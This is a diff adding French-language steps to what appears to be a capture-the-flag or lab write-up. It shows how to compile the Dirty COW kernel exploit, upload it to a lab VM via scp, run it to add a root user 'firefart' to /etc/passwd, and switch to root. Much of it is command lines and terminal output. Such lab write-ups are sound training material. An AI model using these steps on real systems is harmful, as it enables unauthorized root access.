@@ -674,6 +674,12 @@ Néanmoins, la machine distante étant en 32 bit comme l'indique `i686` dans la 
 
 La __solution la plus simple__ est d'__utiliser une machine 32 bit__ avec un __noyau 2.6__ comme la machine __"OWASP Broken Web Apps"__ pour __compiler__ l'exploit.
 
+On dépose sur fichier `dirty.c` sur la machine _OWSAP Broken Web Apps_, et on le compile avec la commande.
+
+```bash
+gcc -pthread dirty.c -o dirty -lcrypt
+```
+
 ------------------------
 
 ### Compiler l'exploit sur Kali Linux
@@ -711,4 +717,44 @@ On peut ensuite uploader notre exploit `dirty` sur la machine "From SQLi to Shel
 scp -i ssh_www-data dirty www-data@192.168.56.112:/tmp/
 ```
 
+Une fois que l'exploit est déposé sur le système. On peut se connecter en SSH, et simplement l'exécuter avec `./dirty`.
 
+L'exploit ajoute un utilisateur `firefart` au système avec les privilèges root. On choisit le mot de passe de cet utilisateur.
+
+```
+www-data@debian:/tmp$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+
+mmap: b778f000
+^C
+```
+On attend quelques secondes, puis on tue l'exploit avec `Ctrl+C`
+
+L'exploit a crée une sauvegarde du fichier `/etc/passwd` en `/tmp/passwd.bak`. Et ajouter l'utilisateur `firefart`.
+
+```
+www-data@debian:/tmp$ ls
+dirty  passwd.bak
+
+www-data@debian:/tmp$ cat /etc/passwd
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+[...]
+www-data:x:33:33:www-data:/var/www:/bin/sh
+[...]
+mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
+```
+
+On peut utiliser `su` pour se connecter avec cet utilisateur. En donnant le mot de passe que l'on a définit lors de l'exécution de l'exploit.
+
+```bash
+www-data@debian:/tmp$ su firefart
+Password: 
+
+firefart@debian:/tmp# id
+uid=0(firefart) gid=0(root) groups=0(root)
+```
